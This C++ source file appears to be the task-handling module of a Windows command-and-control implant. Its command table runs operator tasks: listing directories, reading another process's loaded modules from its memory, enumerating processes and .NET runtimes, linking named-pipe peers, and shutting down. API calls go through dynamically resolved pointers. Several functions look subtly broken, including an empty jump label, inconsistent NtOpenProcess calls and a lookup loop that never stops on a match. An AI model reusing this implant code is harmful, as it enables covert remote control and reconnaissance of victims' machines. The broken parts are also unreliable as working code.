#include <include/commands.hpp>

using namespace Stream;
using namespace Parser;
using namespace Process;
using namespace Dispatcher;

namespace Commands {

    __section(".rdata") _command_map cmd_map[] = {
        { .name = DIRECTORYLIST, 	.address = DirectoryList    },
        { .name = PROCESSMODULES,	.address = ProcessModules   },
        { .name = PROCESSLIST,		.address = ProcessList      },
        { .name = ADDPEER,			.address = AddPeer          },
        { .name = REMOVEPEER,		.address = RemovePeer       },
        { .name = SHUTDOWN,			.address = Shutdown         },
        { .name = 0,				.address = nullptr		    }
    };

    VOID DirectoryList (_parser *const parser) {

        _stream *out = Stream::CreateTaskResponse(DIRECTORYLIST);

        ULONG length    = { };
        LPSTR query     = { };
        LPSTR path      = { };

        HANDLE file                 = { };
        WIN32_FIND_DATAA head       = { };
        ULARGE_INTEGER file_size    = { };
        SYSTEMTIME access_time      = { };
        SYSTEMTIME sys_time         = { };

        query   = UnpackString(parser, nullptr);
        path    = (char*) x_malloc(MAX_PATH);

        if (query[0] == PERIOD) {
            if (!(length = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, path))) {
                return;
            }
            if (path[length - 1] != BSLASH) {
                path[length++] = BSLASH;
            }

            path[length++]  = ASTER;
            path[length]    = NULTERM;
        }
        else {
            x_memcpy(path, query, MAX_PATH);
        }

        if ((file = Ctx->win32.FindFirstFileA(path, &head))) {
            do {
                if (
                    !Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time) ||
                    !Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time)) {
                    return;
                }

                if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    PackDword(out, TRUE);
                }
                else {
                    file_size.HighPart   = head.nFileSizeHigh;
                    file_size.LowPart    = head.nFileSizeLow;

                    PackDword(out, FALSE);
                    PackDword64(out, file_size.QuadPart);
                }

                PackDword(out, access_time.wMonth);
                PackDword(out, access_time.wDay);
                PackDword(out, access_time.wYear);
                PackDword(out, sys_time.wHour);
                PackDword(out, sys_time.wMinute);
                PackDword(out, sys_time.wSecond);
                PackString(out, head.cFileName);
            }
            while (Ctx->win32.FindNextFileA(file, &head) != 0);
        }
        else {
            goto defer;
        }

        MessageQueue(out);

    defer:
        if (file) {
            Ctx->win32.FindClose(file);
        }
        if (path) {
            x_free(path);
        }
    }

    VOID ProcessModules (_parser *const parser) {

        _stream *out = CreateTaskResponse(PROCESSMODULES);

        PPEB_LDR_DATA loads             = { };
        PROCESS_BASIC_INFORMATION pbi   = { };
        HANDLE process                  = { };
        ULONG pid                       = { };

        LDR_DATA_TABLE_ENTRY module = { };
        PLIST_ENTRY head 	        = { };
        PLIST_ENTRY entry           = { };

        CHAR modname_a[MAX_PATH]    = { };
        WCHAR modname_w[MAX_PATH]   = { };

        INT count   = 0;
        SIZE_T size = 0;

        if (!(pid = GetProcessIdByName(UnpackString(parser, nullptr)))) {
            return;
        }

        x_ntassert(NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));
        x_ntassert(Ctx->nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr));
        x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(LDR_DATA_TABLE_ENTRY*), &size));
        x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));

        for (head = &loads->InMemoryOrderModuleList; entry != head; entry = module.InMemoryOrderLinks.Flink) {
            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size));

            x_assert(size == module.FullDllName.Length);

            if (module.FullDllName.Length > 0) {
                size = x_wcstombs(modname_a, modname_w, module.FullDllName.Length);

                PackString(out, modname_a);
                PackDword64(out, (UINT64)module.DllBase);

                count++;
            }

            x_memset(modname_w, 0, MAX_PATH);
            x_memset(modname_a, 0, MAX_PATH);
        }

        MessageQueue(out);
        defer:
    }

    VOID ProcessList(_parser *const parser) {

        _stream *out = CreateTaskResponse(PROCESSLIST);

        PROCESSENTRY32 entries      = { };
        HANDLE snapshot             = { };
        HANDLE process              = { };

        IEnumUnknown *enums         = { };
        ICLRMetaHost *meta          = { };
        ICLRRuntimeInfo *runtime    = { };

        WCHAR buffer[1024];
        DWORD size  = 0;

        size            = ARRAY_LEN(buffer);
        entries.dwSize  = sizeof(PROCESSENTRY32);

        snapshot = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        Ctx->win32.Process32First(snapshot, &entries);

        do {
            BOOL is_managed  = false;
            BOOL is_loaded   = false;

            CLIENT_ID           cid     = { };
            OBJECT_ATTRIBUTES   attr    = { };

            cid.UniqueThread    = nullptr;
            cid.UniqueProcess   = (void*) entries.th32ProcessID;

            InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);

            x_ntassert(Ctx->nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid));
            x_ntassert(Ctx->nt.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, (void**) &meta));
            x_ntassert(meta->lpVtbl->EnumerateInstalledRuntimes(meta, &enums));

            while (S_OK == enums->Next(0x1, (IUnknown**) &runtime, nullptr)) {
                if (runtime->lpVtbl->IsLoaded(runtime, process, &is_loaded) == S_OK && is_loaded == TRUE) {

                    is_managed = TRUE;
                    if (SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &size))) {
                        PackDword(out, entries.th32ProcessID);
                        PackString(out, entries.szExeFile);
                        PackWString(out, buffer);
                        PackByte(out, is_managed);
                    }
                }
                runtime->lpVtbl->Release(runtime);
            }

            if (!is_managed) {
                PackDword(out, entries.th32ProcessID);
                PackString(out, entries.szExeFile);
                PackWString(out, nullptr); // todo: check that PackWString handles nullptrs, here
                PackByte(out, is_managed);
            }

            if (meta) {
                meta->lpVtbl->Release(meta);
            }
            if (runtime) {
                runtime->lpVtbl->Release(runtime);
            }
            if (enums) {
                enums->Release();
            }

            Ctx->nt.NtClose(process);
        }
        while (Ctx->win32.Process32Next(snapshot, &entries));

        MessageQueue(out);

        defer:
        if (snapshot) { Ctx->nt.NtClose(snapshot); }
    }

    VOID AddPeer(_parser *parser) {

        auto pipe_name  = Parser::UnpackWString(parser, nullptr);
        auto peer_id    = Parser::UnpackDword(parser);

        Clients::AddClient(pipe_name, peer_id);
    }

    VOID RemovePeer(_parser *parser) {

        auto peer_id = Parser::UnpackDword(parser);
        Clients::RemoveClient(peer_id);
    }

    VOID Shutdown (_parser *parser) {

        // Send final message
        // Zero/Free all memory
        // Exit
        ntstatus = ERROR_EXIT;
    }


    UINT_PTR GetCommandAddress(const uint32_t name) {

        uintptr_t address = { };

        for (uint32_t i = 0 ;; i++) {
            if (!cmd_map[i].name) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (cmd_map[i].name == name) {
                address = U_PTR(cmd_map[i].address);
            }
        }

        defer:
        return address;
    }
}
